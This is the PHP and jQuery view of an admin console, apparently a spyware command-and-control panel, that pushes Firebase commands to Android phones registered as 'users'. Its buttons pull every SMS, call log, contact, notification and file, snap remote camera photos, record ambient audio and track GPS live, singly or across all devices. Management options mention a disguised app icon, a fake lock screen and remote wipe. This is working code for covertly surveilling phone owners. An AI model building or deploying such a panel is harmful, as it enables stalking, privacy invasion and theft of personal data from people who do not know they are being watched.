<div class="content-wrapper">
    <!-- Page Header -->
    <section class="content-header">
        <div class="container-fluid">
            <div class="row mb-2 align-items-center">
                <div class="col-sm-6">
                    <h1><i class="fas fa-mobile-alt text-primary mr-2"></i>Remote Device Management</h1>
                </div>
                <div class="col-sm-6">
                    <ol class="breadcrumb float-sm-right">
                        <li class="breadcrumb-item"><a href="<?= base_url('admin/dashboard') ?>">Admin</a></li>
                        <li class="breadcrumb-item active">Remote Device</li>
                    </ol>
                </div>
            </div>
        </div>
    </section>

    <section class="content">
        <div class="container-fluid">

            <!-- Page Callout -->
            <div class="callout callout-info">
                <h5><i class="fas fa-satellite-dish mr-2"></i>Remote Device Control Console</h5>
                <p class="mb-0 text-muted small">
                    Send push commands to connected Android client devices to extract logs, change configurations, query status,
                    or manage the app installation lifecycle. Select a target user below, then choose a command.
                </p>
            </div>

            <!-- Target Selection Card -->
            <div class="card card-outline card-info shadow-sm mb-4">
                <div class="card-header">
                    <h3 class="card-title font-weight-bold">
                        <i class="fas fa-users text-info mr-2"></i>Target Selection
                    </h3>
                </div>
                <div class="card-body">
                    <div class="row align-items-end">
                        <div class="col-md-8">
                            <label class="font-weight-600">
                                <i class="fas fa-user text-muted mr-1"></i> Apply to Device(s)
                            </label>
                            <select class="form-control" id="targetUserId">
                                <option value="all">All Users (Broadcast to all registered devices)</option>
                                <?php if (!empty($users)): ?>
                                    <?php foreach ($users as $u): ?>
                                    <option value="<?= $u['id'] ?>"><?= htmlspecialchars($u['username']) ?></option>
                                    <?php endforeach; ?>
                                <?php endif; ?>
                            </select>
                            <small class="text-muted d-block mt-1">Choose a specific user or broadcast the same command to all active devices.</small>
                        </div>
                        <div class="col-md-4 mt-3 mt-md-0">
                            <label class="font-weight-600">
                                <i class="fas fa-dot-circle text-muted mr-1"></i> Selection Status
                            </label>
                            <div class="form-control bg-light" id="currentTargetDisplay" style="min-height:38px; display:flex; align-items:center;">
                                <?php if (empty($users)): ?>
                                    <span class="text-warning font-weight-600"><i class="fas fa-exclamation-triangle mr-1"></i> No registered devices</span>
                                <?php else: ?>
                                    <span class="text-success font-weight-600"><i class="fas fa-check-circle mr-1"></i> <?= count($users) ?> user(s) available</span>
                                <?php endif; ?>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Main Tab Card -->
            <div class="card card-primary card-outline shadow-sm">
                <div class="card-header p-0 pt-1 border-bottom-0">
                    <ul class="nav nav-tabs" id="adminRemoteTabs" role="tablist">
                        <li class="nav-item">
                            <a class="nav-link active" data-toggle="tab" href="#tab-fetch" role="tab">
                                <i class="fas fa-database mr-1"></i> Data Fetch
                            </a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" data-toggle="tab" href="#tab-mgmt" role="tab">
                                <i class="fas fa-cogs mr-1"></i> Device Management
                            </a>
                        </li>

                    </ul>
                </div>

                <div class="card-body">
                    <div class="tab-content">

                        <!-- ====================== TAB 1: DATA FETCH ====================== -->
                        <div class="tab-pane fade show active" id="tab-fetch" role="tabpanel">
                            <div class="alert alert-light border-left-primary border mb-4">
                                <i class="fas fa-info-circle text-primary mr-2"></i>
                                Commands fetch telemetry and forensic data from the selected user's device(s). Each device must be online to receive commands.
                            </div>
                            <div class="row" id="admin-fetch-grid">
                                <?php
                                $fetchCmds = [
                                    ['id' => 'sms',           'label' => 'Fetch SMS',      'icon' => 'fa-sms',            'color' => '#007bff', 'desc' => 'All SMS messages'],
                                    ['id' => 'calls',         'label' => 'Call Logs',      'icon' => 'fa-phone-alt',      'color' => '#28a745', 'desc' => 'Full call history'],
                                    ['id' => 'contacts',      'label' => 'Contacts',       'icon' => 'fa-address-book',   'color' => '#17a2b8', 'desc' => 'Full contact list'],
                                    ['id' => 'search_data',   'label' => 'Keyword Search', 'icon' => 'fa-search',         'color' => '#00acc1', 'desc' => 'Search SMS/Call data'],
                                    ['id' => 'capture_photo', 'label' => 'Camera Snap',    'icon' => 'fa-camera',         'color' => '#d81b60', 'desc' => 'Remote photo capture'],
                                    ['id' => 'record_audio',  'label' => 'Ambient Audio',  'icon' => 'fa-microphone',     'color' => '#ff8f00', 'desc' => 'Record environment audio'],
                                    ['id' => 'files',         'label' => 'File List',      'icon' => 'fa-file-alt',       'color' => '#20c997', 'desc' => 'Recent files'],
                                    ['id' => 'fetch_file',    'label' => 'Targeted File',  'icon' => 'fa-file-download',  'color' => '#00897b', 'desc' => 'Fetch specific file'],
                                    ['id' => 'location',      'label' => 'GPS Location',   'icon' => 'fa-map-marker-alt', 'color' => '#dc3545', 'desc' => 'Precise location'],
                                    ['id' => 'start_tracking','label' => 'Live Tracking',  'icon' => 'fa-route',          'color' => '#e53935', 'desc' => 'Real-time GPS'],
                                    ['id' => 'context',       'label' => 'Context',        'icon' => 'fa-walking',        'color' => '#e83e8c', 'desc' => 'Motion & state'],
                                    ['id' => 'apps',          'label' => 'Apps List',      'icon' => 'fa-th-large',       'color' => '#6f42c1', 'desc' => 'Installed apps'],
                                    ['id' => 'usage',         'label' => 'App Usage',      'icon' => 'fa-chart-pie',      'color' => '#6610f2', 'desc' => 'Screen-time stats'],
                                    ['id' => 'notifications', 'label' => 'Notifications',  'icon' => 'fa-bell',           'color' => '#ffc107', 'desc' => 'Status bar alerts'],
                                    ['id' => 'device_info',   'label' => 'Device Info',    'icon' => 'fa-info-circle',    'color' => '#6c757d', 'desc' => 'Hardware & build'],
                                    ['id' => 'misc_hardware', 'label' => 'Misc Hardware',  'icon' => 'fa-microchip',      'color' => '#117a8b', 'desc' => 'Sensors, network, Bluetooth'],
                                    ['id' => 'misc_software', 'label' => 'Misc Software',  'icon' => 'fa-calendar-alt',   'color' => '#fd7e14', 'desc' => 'Calendar, locale, accounts'],
                                    ['id' => 'beep',          'label' => 'Test Beep',      'icon' => 'fa-volume-up',      'color' => '#8e44ad', 'desc' => 'Play a beep sound'],
                                    ['id' => 'all',           'label' => 'Sync All',       'icon' => 'fa-sync-alt',       'color' => '#b21f2d', 'desc' => 'Full extraction'],
                                ];
                                foreach ($fetchCmds as $c):
                                ?>
                                <div class="col-6 col-sm-4 col-md-3 col-lg-2 mb-3 text-center">
                                    <button class="btn btn-block btn-admin-fetch p-3 shadow-sm border h-100 d-flex flex-column align-items-center justify-content-center"
                                            data-cmd="<?= $c['id'] ?>"
                                            style="border-radius:10px; background:#fff; transition:all 0.25s ease-in-out; cursor:pointer;">
                                        <div class="mb-2" style="color:<?= $c['color'] ?>; font-size:1.9rem; width:52px; height:52px; display:flex; align-items:center; justify-content:center; background:rgba(0,0,0,0.03); border-radius:50%;">
                                            <i class="fas <?= $c['icon'] ?>"></i>
                                        </div>
                                        <span class="font-weight-bold text-dark mb-1" style="font-size:13px;"><?= $c['label'] ?></span>
                                        <small class="text-muted d-none d-sm-block" style="font-size:10.5px; line-height:1.3;"><?= $c['desc'] ?></small>
                                    </button>
                                </div>
                                <?php endforeach; ?>
                            </div>
                        </div>

                        <!-- ====================== TAB 2: DEVICE MANAGEMENT ====================== -->
                        <div class="tab-pane fade" id="tab-mgmt" role="tabpanel">
                            <div class="alert alert-warning mb-4">
                                <i class="fas fa-exclamation-triangle mr-2"></i>
                                <strong>Critical Operations:</strong> These commands force irreversible actions on client devices. Confirm target inputs before proceeding.
                            </div>
                            <div class="row">

                                <!-- Reset App -->
                                <div class="col-md-6 col-lg-4 mb-4">
                                    <div class="card card-outline card-warning h-100 shadow-sm">
                                        <div class="card-body text-center p-4">
                                            <div class="mb-3"><i class="fas fa-undo fa-3x text-warning"></i></div>
                                            <h5 class="card-title text-warning font-weight-bold">Reset App</h5>
                                            <p class="text-muted small mb-4">Restores default app icon/disguise, resets emergency access launch code to factory default.</p>
                                            <button class="btn btn-warning btn-block font-weight-bold btn-admin-mgmt" data-cmd="reset_app">
                                                <i class="fas fa-undo mr-1"></i> Execute Reset
                                            </button>
                                        </div>
                                    </div>
                                </div>

                                <!-- Deactivate App -->
                                <div class="col-md-6 col-lg-4 mb-4">
                                    <div class="card card-outline card-secondary h-100 shadow-sm">
                                        <div class="card-body text-center p-4">
                                            <div class="mb-3"><i class="fas fa-eye-slash fa-3x text-secondary"></i></div>
                                            <h5 class="card-title text-secondary font-weight-bold">Deactivate App</h5>
                                            <p class="text-muted small mb-4">Replaces the active user interface with a dummy screen lock. Suspends extraction logging.</p>
                                            <button class="btn btn-secondary btn-block font-weight-bold btn-admin-mgmt" data-cmd="deactivate">
                                                <i class="fas fa-eye-slash mr-1"></i> Deactivate Screen
                                            </button>
                                        </div>
                                    </div>
                                </div>

                                <!-- Logout User -->
                                <div class="col-md-6 col-lg-4 mb-4">
                                    <div class="card card-outline card-info h-100 shadow-sm">
                                        <div class="card-body text-center p-4">
                                            <div class="mb-3"><i class="fas fa-sign-out-alt fa-3x text-info"></i></div>
                                            <h5 class="card-title text-info font-weight-bold">Logout User</h5>
                                            <p class="text-muted small mb-4">Clears authorization tokens on the device immediately and stops all periodic background services.</p>
                                            <button class="btn btn-info btn-block font-weight-bold btn-admin-mgmt" data-cmd="logout">
                                                <i class="fas fa-sign-out-alt mr-1"></i> Force Logout
                                            </button>
                                        </div>
                                    </div>
                                </div>

                                <!-- Uninstall Keep Data -->
                                <div class="col-md-6 col-lg-4 mb-4">
                                    <div class="card card-outline card-danger h-100 shadow-sm">
                                        <div class="card-body text-center p-4">
                                            <div class="mb-3"><i class="fas fa-archive fa-3x text-danger"></i></div>
                                            <h5 class="card-title text-danger font-weight-bold">Uninstall (Keep Data)</h5>
                                            <p class="text-muted small mb-4">Backs up unsaved records, then opens system uninstallation wizard. Data remains in cloud logs.</p>
                                            <button class="btn btn-danger btn-block font-weight-bold btn-admin-mgmt" data-cmd="uninstall_preserve">
                                                <i class="fas fa-archive mr-1"></i> Uninstall &amp; Preserve
                                            </button>
                                        </div>
                                    </div>
                                </div>

                                <!-- Uninstall Wipe All -->
                                <div class="col-md-6 col-lg-4 mb-4">
                                    <div class="card card-outline card-dark h-100 shadow-sm">
                                        <div class="card-body text-center p-4">
                                            <div class="mb-3"><i class="fas fa-trash-alt fa-3x text-dark"></i></div>
                                            <h5 class="card-title font-weight-bold">Uninstall (Wipe All)</h5>
                                            <p class="text-muted small mb-4">Clears offline SQLite databases, purges backups, and triggers complete system package removal.</p>
                                            <button class="btn btn-dark btn-block font-weight-bold btn-admin-mgmt" data-cmd="uninstall_wipe">
                                                <i class="fas fa-trash-alt mr-1"></i> Uninstall &amp; Wipe All
                                            </button>
                                        </div>
                                    </div>
                                </div>

                            </div><!-- /.row -->
                        </div><!-- /.tab-pane#tab-mgmt -->



                    </div><!-- /.tab-content -->
                </div><!-- /.card-body -->

                <div class="card-footer bg-light">
                    <div class="d-flex align-items-center">
                        <i class="fas fa-info-circle text-muted mr-2"></i>
                        <small class="text-muted">Commands are sent via Firebase Cloud Messaging (FCM). Devices must be online to receive them. Some actions require Device Admin privileges.</small>
                    </div>
                </div>

            </div><!-- /.card -->

        </div><!-- /.container-fluid -->
    </section>
</div><!-- /.content-wrapper -->

<style>
.btn-admin-fetch:hover {
    transform: translateY(-4px);
    box-shadow: 0 8px 20px rgba(0,0,0,0.12) !important;
    border-color: #007bff !important;
}
.btn-admin-fetch:active { transform: translateY(-1px); }
.btn-admin-fetch.loading { opacity: 0.65; pointer-events: none; }
.btn-admin-mgmt.loading  { opacity: 0.65; pointer-events: none; }
</style>

<script>
function getUserId() { return $('#targetUserId').val(); }

function sendCmd(userId, command, payload, extra) {
    const $btn = $(event.target).closest('button');
    if ($btn.length) {
        $btn.data('orig-html', $btn.html()).prop('disabled', true).html('<i class="fas fa-spinner fa-spin mr-1"></i> Sending…');
    }
    $.ajax({
        url: '<?= base_url('admin/remote-device/send') ?>',
        method: 'POST',
        data: { user_id: userId, command: command, payload: payload, extra_data: JSON.stringify(extra || {}) },
        dataType: 'json',
        timeout: 120000,
        success(r) {
            if ($btn.length) $btn.prop('disabled', false).html($btn.data('orig-html') || 'Send');
            if (r.success) {
                Swal.fire({ icon:'success', title:'Command Sent', text: r.message, timer:3000, showConfirmButton:false });
            } else {
                Swal.fire({ icon:'error', title:'Error', text: r.message || 'Failed to send command.' });
            }
        },
        error() {
            if ($btn.length) $btn.prop('disabled', false).html($btn.data('orig-html') || 'Send');
            Swal.fire({ icon:'error', title:'Network Error', text:'Could not reach the server.' });
        }
    });
}

$(function() {
    $('#targetUserId').on('change', function() {
        const v = $(this).val();
        $('#currentTargetDisplay').html(v === 'all'
            ? '<span class="text-info"><i class="fas fa-globe mr-1"></i> Broadcasting to ALL users</span>'
            : '<span class="text-success"><i class="fas fa-user mr-1"></i> Targeting: ' + $(this).find('option:selected').text() + '</span>');
        loadDeviceConfig();
    });

    // ---- Data Fetch ----
    $('.btn-admin-fetch').on('click', function() {
        const cmd    = $(this).data('cmd');
        const userId = getUserId();
        const label  = $(this).find('span').first().text() || cmd;
        const prompts = {
            fetch_file:    { title:'File Path',   text:'Enter exact file path:',              input:'text'   },
            search_data:   { title:'Keyword',     text:'Enter keyword to search in SMS/Calls:', input:'text'  },
            start_tracking:{ title:'Duration',    text:'Enter tracking duration in minutes:',  input:'number', value:60 },
        };
        if (prompts[cmd]) {
            Swal.fire({
                title: prompts[cmd].title, text: prompts[cmd].text,
                input: prompts[cmd].input, inputValue: prompts[cmd].value,
                showCancelButton: true, confirmButtonText: 'Send',
                inputValidator: v => { if (!v) return 'This field is required!'; }
            }).then(r => {
                if (r.isConfirmed) sendCmd(userId, 'cmd_' + cmd, cmd, { file_path: r.value, keyword: r.value, duration_minutes: r.value });
            });
        } else {
            Swal.fire({
                title: 'Send ' + label + '?',
                text:  'Send to ' + (userId === 'all' ? 'ALL users' : 'selected user') + '?',
                icon: 'question', showCancelButton: true, confirmButtonText: 'Send Command'
            }).then(r => {
                if (r.isConfirmed) sendCmd(userId, 'cmd_' + cmd, cmd, {});
            });
        }
    });

    // ---- Device Management ----
    $('.btn-admin-mgmt').on('click', function() {
        const cmd    = $(this).data('cmd');
        const userId = getUserId();
        const mgmtPay = { reset_app:'reset', deactivate:'deactivate', logout:'logout', uninstall_preserve:'uninstall_preserve', uninstall_wipe:'uninstall_wipe' };
        const titles  = { reset_app:'Reset App', deactivate:'Deactivate App', logout:'Force Logout', uninstall_preserve:'Uninstall (Keep Data)', uninstall_wipe:'Uninstall (Wipe All)' };
        Swal.fire({
            title: titles[cmd] || 'Execute Command?',
            text:  'This will be sent to ' + (userId === 'all' ? 'ALL users' : 'the selected user') + '. This action may be irreversible.',
            icon: 'warning', showCancelButton: true, confirmButtonColor: '#dc3545', confirmButtonText: 'Execute'
        }).then(r => {
            if (r.isConfirmed) sendCmd(userId, 'cmd_' + cmd, mgmtPay[cmd] || cmd, {});
        });
    });

});
</script>
